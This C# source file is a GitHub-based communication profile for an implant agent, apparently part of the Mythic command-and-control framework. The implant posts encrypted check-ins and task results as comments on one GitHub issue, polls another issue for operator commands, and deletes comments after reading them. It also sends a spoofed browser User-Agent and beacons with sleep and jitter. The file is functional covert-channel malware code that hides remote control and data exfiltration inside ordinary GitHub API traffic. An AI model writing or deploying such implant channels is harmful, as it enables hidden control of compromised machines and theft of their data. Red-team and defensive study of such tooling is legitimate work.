using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text;
using System.Text.Json;
using System.Net.Http;

namespace Agent.Profiles
{
    public class GitHub : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _uuid = Guid.NewGuid().ToString();
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        private static readonly HttpClient client = new HttpClient();
        private const string GITHUB_TOKEN = "";
        private const string OWNER = "";
        private const string REPO = "";
        private const int SERVER_ISSUE = 1;
        private const int CLIENT_ISSUE = 2;
        private const string URL = $"";
        public GitHub(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            crypt = crypto;
            agentConfig = config;
            this.messageManager = messageManager;

            client.DefaultRequestHeaders.Add("Authorization", $"token {GITHUB_TOKEN}");
            client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            // Post Checkin Message
            //Console.WriteLine("Start checkin");
            //Console.WriteLine(agentConfig.uuid);

            var json = this.crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
            string url = $"{URL}/{CLIENT_ISSUE}/comments";
            var msg = new { body = json };
            var content = new StringContent(JsonSerializer.Serialize(msg), Encoding.UTF8, "application/json");
            
            var response = await client.PostAsync(url, content);
            if (response.IsSuccessStatusCode)
            {
                //Console.WriteLine("Comment successfully created.");
            }
            else
            {
                //Console.WriteLine($"Failed to create comment. Status code: {response.StatusCode}");
                //Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
            }

            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                // Relax.. wait for Mythic to post a checkin response 
                // to GitHub for the agent to retrieve 
                await Task.Delay(3000);

                // Get checkin response
                var comments = await GetComments(SERVER_ISSUE);
                foreach (var comment in comments)
                {
                    var message = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
                    var payloadUuid = message.Substring(0, 36);
                    var mythMsg = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Substring(36));

                    if (payloadUuid == agentConfig.uuid)
                    {
                        if (mythMsg["action"] == "checkin" && payloadUuid != mythMsg["id"])
                        {
                            //Console.WriteLine($"Updating new UUID to: {mythMsg["id"]}");
                            this.cir = JsonSerializer.Deserialize<CheckinResponse>(message.Substring(36));
                            this.checkedin = true;
                            await DeleteComment(comment.id);
                            return this.cir;
                        }
                    }
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);
            
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            //Console.WriteLine(agentConfig.uuid);
            this.cancellationTokenSource = new CancellationTokenSource();
            List<(string id, string body)> comments = new List<(string id, string body)>();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Console.WriteLine("Checking In");
                // Check if we have responses to send
                if (this.messageManager.HasResponses())
                {
                    await PostComment(await messageManager.GetAgentResponseStringAsync());
                }

                // Check for new tasks
                comments = await GetComments(SERVER_ISSUE);
                if (comments.Count() > 0) {    
                    foreach (var comment in comments) 
                    {
                        var m = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
                        var payloadUuid = m.Substring(0, 36);
                        if (payloadUuid == agentConfig.uuid)
                        {
                            //Console.WriteLine("New Task received!");
                            GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(m.Substring(36));
                            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                            this.SetTaskingReceived(this, tra);
                            DeleteComment(comment.id);
                        }
                    }
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }

                // Rest
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        static async Task<List<(string id, string body)>> GetComments(int issueNumber)
        {
            var response = await client.GetAsync($"{URL}/{issueNumber}/comments");
            response.EnsureSuccessStatusCode();
            var jsonResponse = await response.Content.ReadAsStringAsync();

            var comments = JsonSerializer.Deserialize<List<Dictionary<string, object>>>(jsonResponse);
            var result = new List<(string id, string body)>();

            foreach (var comment in comments)
            {
                result.Add((comment["id"].ToString(), comment["body"].ToString()));
            }

            return result;
        }

        private async Task PostComment(string json)
        {
            //Console.WriteLine(json);
            string msg = this.crypt.Encrypt(json);
            var url = $"{URL}/{CLIENT_ISSUE}/comments";
            var payload = new { body = msg };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            await client.PostAsync(url, content);
        }

        static async Task DeleteComment(string commentId)
        {
            var url = $"{URL}/comments/{commentId}";
            await client.DeleteAsync(url);
        }
    }
}